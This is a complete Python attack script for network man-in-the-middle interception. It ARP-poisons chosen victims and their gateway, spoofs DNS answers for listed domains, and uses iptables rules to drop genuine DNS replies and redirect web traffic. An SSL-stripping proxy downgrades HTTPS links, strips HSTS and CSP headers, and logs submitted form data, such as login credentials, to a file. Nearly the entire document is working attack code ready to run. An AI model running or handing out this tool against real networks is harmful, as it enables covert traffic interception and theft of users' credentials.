#!/usr/bin/env python3
from scapy.all import *
import threading, argparse, sys, os, time, socketserver, requests
from http.server import BaseHTTPRequestHandler

def enable_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def flush_iptables():
    os.system("iptables --flush")
    os.system("iptables -t nat --flush")
    os.system("iptables --delete-chain")

def setup_dns_block(victim_ip):
    # 1. Ensure Kali's kernel doesn't try to handle the DNS packet itself
    os.system(f"iptables -I FORWARD -p udp -s {victim_ip} --dport 53 -j ACCEPT")
    # 2. DROP the gateway's outgoing DNS responses so the victim only hears YOUR script
    os.system(f"iptables -I FORWARD -p udp --sport 53 -d {victim_ip} -j DROP")

def setup_http_redirect(victim_ip, iface, proxy_port=8080):
    os.system(f"iptables -t nat -A PREROUTING -i {iface} -p tcp -s {victim_ip} --dport 80 -j REDIRECT --to-port {proxy_port}")

class ARPPoisoning(threading.Thread):
    def __init__(self, iface, src_ip, dst_ip):
        threading.Thread.__init__(self, daemon=True)
        self.iface, self.src_ip, self.dst_ip = iface, src_ip, dst_ip
        self.dst_mac = getmacbyip(dst_ip)

    def run(self):
        if not self.dst_mac:
            print(f"[!] Could not find MAC for {self.dst_ip}")
            return
        pkt = Ether(dst=self.dst_mac)/ARP(pdst=self.dst_ip, psrc=self.src_ip, op=2)
        while True:
            sendp(pkt, iface=self.iface, verbose=False)
            time.sleep(2)

class DNSSpoofing:
    def __init__(self, iface, domains_file):
        self.iface = iface
        self.target = self._load_domains(domains_file)

    def _load_domains(self, domains_file):
        targets = {}
        if not os.path.exists(domains_file): return {}
        with open(domains_file, "r") as fd:
            for line in fd:
                if ":" in line:
                    domain, ip = line.strip().split(":", 1)
                    targets[domain.strip().encode()] = ip.strip()
        return targets

    def start(self):
        sniff(iface=self.iface, filter="udp port 53", store=0, prn=self._handle_packet)

    def _handle_packet(self, pkt):
        # INDENTATION FIXED: Using spaces only
        if IP in pkt and pkt[IP].src == get_if_addr(self.iface): 
            return
            
        try:
            if not pkt.haslayer(DNS) or pkt[DNS].qr != 0: return
            qname = pkt[DNS].qd.qname
            for domain, ip in self.target.items():
                if qname.rstrip(b'.') == domain.rstrip(b'.'):
                    print(f"[!] Spoofing DNS: {qname.decode()} -> {ip}")
                    res = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=qname, rdata=ip))
                    send(res, verbose=False)
        except Exception: pass

class SSLStripHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args): return 

    def do_POST(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            
            if post_data:
                print(f"\n\033[91m[!] STEALTH CAPTURE [{self.headers.get('Host')}]:\033[0m {post_data}\n")
                with open("captured_data.txt", "a") as f:
                    f.write(f"[{time.strftime('%H:%M:%S')}] Host: {self.headers.get('Host')} | Data: {post_data}\n")
        except: pass
        self.do_GET()

    def do_GET(self):
        host = self.headers.get("Host")
        path = self.path
        headers = {k: v for k, v in self.headers.items() if k.lower() != 'accept-encoding'}
        
        # 1. Start by "guessing" the site uses HTTPS
        url = f"https://{host}{path}"
        
        try:
            try:
                # Attempt to fetch via HTTPS
                r = requests.get(url, headers=headers, verify=False, timeout=3, allow_redirects=True)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
                # 2. FALLBACK: If HTTPS fails, the site likely only supports HTTP (like vulnweb)
                print(f"[*] HTTPS failed for {host}, falling back to HTTP...")
                url = f"http://{host}{path}"
                r = requests.get(url, headers=headers, timeout=3, allow_redirects=True)
            
            # 3. SSL Stripping: Convert all secure links to insecure to keep victim on HTTP
            content = r.content.decode("utf-8", errors="ignore").replace("https://", "http://")
            encoded_content = content.encode("utf-8")

            # 4. Forward the response to the victim
            self.send_response(r.status_code)

            for key, value in r.headers.items():
                low_key = key.lower()
                # Strip security headers that prevent MITM (HSTS and CSP)
                if low_key not in ['content-encoding', 'transfer-encoding', 'content-length', 
                                   'strict-transport-security', 'content-security-policy']:
                    self.send_header(key, value)
            
            self.send_header("Content-Length", str(len(encoded_content)))
            self.send_header("Connection", "close")
            self.end_headers()

            try:
                self.wfile.write(encoded_content)
            except BrokenPipeError:
                pass 
                
        except Exception as e:
            print(f"[!] Proxy error connecting to {host}: {e}")
            try: self.send_error(502)
            except: pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", help="Victim IPs")
    parser.add_argument("-g", "--gateway")
    parser.add_argument("-d", "--domains")
    parser.add_argument("-i", "--interface", default="eth0")
    parser.add_argument("--mode", default="full")
    args = parser.parse_args()
    
    target_list = [t.strip() for t in args.target.split(",")]

    enable_forwarding()
    flush_iptables()

    print(f"[*] Attack started on {len(target_list)} targets.")

    for victim in target_list:
        print(f"[*] Poisoning: {victim}")
        ARPPoisoning(args.interface, args.gateway, victim).start()
        ARPPoisoning(args.interface, victim, args.gateway).start()
        if "dns" in args.mode or "full" in args.mode:
            setup_dns_block(victim)
        if "full" in args.mode:
            setup_http_redirect(victim, args.interface)

    if "dns" in args.mode or "full" in args.mode:
        dns_thread = threading.Thread(target=DNSSpoofing(args.interface, args.domains).start, daemon=True)
        dns_thread.start()
        
    if "full" in args.mode:
        print("[*] Launching SSL Strip Proxy on port 8080...")
        def start_http():
            with socketserver.TCPServer(("", 8080), SSLStripHandler) as httpd:
                httpd.serve_forever()
        
        http_thread = threading.Thread(target=start_http, daemon=True)
        http_thread.start()

    try: 
        while True: time.sleep(1)
    except KeyboardInterrupt: 
        flush_iptables()

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
